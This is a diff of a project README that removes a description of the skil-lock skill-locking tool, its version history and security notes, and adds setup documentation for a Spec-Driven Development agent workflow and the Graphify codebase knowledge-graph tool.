+Beyond the gateway stack, this repo comes with a full **Spec-Driven Development (SDD)** lifecycle powered by [gentle-ai](https://github.com/Gentleman-Programming/gentle-ai).
 
-To keep the scope narrow and the positioning clean:
+SDD is a structured, multi-phase workflow that disciplines AI agents into producing verified, spec-aligned code:
 
-- No runtime guard / Claude Code hooks integration - different problem
-- No Cursor / Windsurf / MCP parsers - different file formats; expand based on demand
-- No AI-assisted detection - three deterministic detectors only
-- No known-bad pattern database - that's Mondoo's lane
-- No web dashboard or registry
+```
+sdd-init  →  sdd-explore  →  sdd-propose  →  sdd-design
+→  sdd-spec  →  sdd-tasks  →  sdd-apply  →  sdd-verify
+→  sdd-archive
+```
 
-See [`SPEC.md`](./SPEC.md) for the full file-format specification. The out-of-scope list above is the canonical statement of what v0.1 will and will not do.
+Each phase is implemented as an OpenCode sub-agent defined in [`.opencode/opencode.json`](.opencode/opencode.json):
 
-## Project status
+| Phase | Agent | What it does |
+|---|---|---|
+| **sdd-init** | `sdd-init` | Bootstrap SDD context and project configuration |
+| **sdd-explore** | `sdd-explore` | Investigate codebase, think through ideas |
+| **sdd-propose** | `sdd-propose` | Create change proposals from explorations |
+| **sdd-design** | `sdd-design` | Write technical design from proposals |
+| **sdd-spec** | `sdd-spec` | Write detailed specifications from designs |
+| **sdd-tasks** | `sdd-tasks` | Break specs into atomic implementation tasks |
+| **sdd-apply** | `sdd-apply` | Implement code changes from task definitions |
+| **sdd-verify** | `sdd-verify` | Validate implementation against specs |
+| **sdd-archive** | `sdd-archive` | Archive completed change artifacts |
 
-- CLI: `v0.2.2` - SARIF findings now carry the OWASP Agentic Skills Top 10 (AST10) taxonomy (per-rule + per-finding AST risk IDs) so Code Scanning alerts map to AST01-AST10. v0.2.1 added exhaustive sibling-file digests (every file a skill ships is hashed, not just `scripts/` and `resources/`) and PR-scoped approvals (a reverted-then-reintroduced delta re-blocks instead of riding a stale approval). v0.2.0 added per-bundled-script content digests, cosign keyless signing + SLSA provenance + SBOM on releases, and a documented detection boundary; v0.1.2 was a renderer typography fix; v0.1.1 added SARIF output + multi-platform release binaries.
-- GitHub Action: [`skil-lock-action@v0.2.1`](https://github.com/skills-lock/skil-lock-action/releases/tag/v0.2.1) - unchanged; set `pin-binary: v0.2.2` to run the latest CLI.
-- Release notes + earlier history: [skil-lock releases](https://github.com/skills-lock/skil-lock/releases) and [skil-lock-action releases](https://github.com/skills-lock/skil-lock-action/releases)
+Phase prompts live in [`.opencode/prompts/sdd/`](.opencode/prompts/sdd/) and are read by the agents via file-reference pointers in the agent config. This means the SDD workflow is **self-contained in the repo** — no global skill registry entries, no external prompt dependencies.
+
+SDD is paired with **strict TDD** enforcement: the `sdd-apply` phase runs tests before writing implementation code, and the `sdd-verify` phase validates behaviour against the spec, not just test coverage.
+
+The orchestrator agent (`gentle-orchestrator` in `.opencode/opencode.json`) coordinates the SDD pipeline — it delegates each phase to the appropriate sub-agent, maintains a thin conversation thread, and never does inline work itself.
+
+```bash
+# Install gentle-ai (one-time)
+just gentle-ai-install
+
+# Set up for this project (workspace-scoped)
+just gentle-ai-setup
+
+# Initialize SDD context — then inside OpenCode, run: /sdd-init
+just gentle-ai-sdd-init
+
+# Create an SDD profile with per-phase models
+just gentle-ai-profile name="default" design="gpt-4o" implement="gpt-4o-mini"
+```
+
+---
+
+## Graphify: Knowledge Graph for Your Codebase
+
+[Graphify](https://github.com/safishamsi/graphify) turns your code, docs, SQL schemas, and any other assets into a queryable knowledge graph — giving AI assistants a structural map of the project instead of forcing them to grep through files.
+
+Type `/graphify .` in OpenCode and get:
+
+```
+graphify-out/
+├── graph.html       # interactive browser visualization — click nodes, filter, search
+├── GRAPH_REPORT.md  # highlights: key concepts, surprising connections, suggested questions
+└── graph.json       # full graph — query anytime without re-reading files
+```
+
+### Setup (one-time)
+
+```bash
+# Install the tool
+just graphify-install
+
+# Register the skill with OpenCode and install always-on graph instructions
+just graphify-setup
+```
+
+### Build and Query
+
+```bash
+# Build the graph for this project
+just graphify-build
+
+# Incremental update (only changed files — fast)
+just graphify-update
+
+# Query in natural language
+just graphify-query query="what connects Bifrost to the OpenTelemetry collector?"
+
+# Open interactive visualization
+just graphify-ui
+
+# Auto-rebuild on every git commit (AST-only, no API cost)
+just graphify-hook
+```
+
+### Team Workflow
+
+`graphify-out/` is committed to the repo so every team member starts with a map. Only local artifacts are excluded:
+
+```
+graphify-out/cost.json   ← local only (.gitignore'd)
+graphify-out/cache/      ← optional, .gitignore'd to keep repo lean
+```
+
+One person runs `just graphify-build` and commits `graphify-out/`. Everyone else pulls and their AI assistant reads the graph immediately. Run `just graphify-hook` to keep it current after each commit.
+
+---
+
+## Everything Lives in This Repo
+
+No global installations required beyond foundational tooling (Docker, just, Node.js):
+
+| Component | Where it lives | Global? |
+|---|---|---|
+| Provider config | `bifrost/config.json` | No |
+| OpenCode workspace | `.opencode/opencode.json` | No |
+| Agent definitions + SDD prompts | `.opencode/opencode.json` + `.opencode/prompts/sdd/` | No |
+| Agent skills | `.agents/skills/` | No |
+| Skill lock/capabilities | `skills.lock`, `skills-lock.json`, `.skil-lock.yaml` | No |
+| Docker compose | `docker-compose.yaml` | No |
+| Just recipes | `justfile` + `just/*.just` | No |
+| Per-scope env templates | `*/.env.example` | No |
+| OpenCode plugin | `npm install -g opencode-with-claude` (one-time) | Yes (npm) |
+| gentle-ai | `brew install gentle-ai` (one-time) | Yes (brew) |
+| graphify | `uv tool install graphifyy` (one-time) | Yes (uv tool) |
+| graphify skill + graph | `graphify-out/`, `.agents/skills/graphify/` | No |
+
+The intent: **clone → copy env files → `just up`** and your entire AI development environment is ready. The only globally installed packages are the launchers themselves; all configuration, skills, prompts, and policies are repo-local and version-controlled.
+
+---
 
 ## License
 
-Apache 2.0 - see [LICENSE](./LICENSE). Contributions are covered by a one-time CLA via [cla-assistant.io](https://cla-assistant.io) (see [CONTRIBUTING.md](./CONTRIBUTING.md)).
-
-## Security
-
-Report vulnerabilities privately via [GitHub Security Advisories](https://github.com/skills-lock/skil-lock/security/advisories/new). See [SECURITY.md](./SECURITY.md). Do not file public issues for vulnerabilities.
-
-## Trademarks
-
-`SkilLock` and `skil-lock` are not affiliated with or endorsed by Skil power tools (a brand owned by Chervon Group). The name comes from "Skill Lock" and refers to AI Skills, not to power tools.
-
-`Claude` and `Claude Code` are trademarks of Anthropic PBC. `Codex` is a trademark of OpenAI, OpCo, LLC. References to these names in this project are descriptive (nominative fair use) and do not imply affiliation with or endorsement by either company.
+MIT
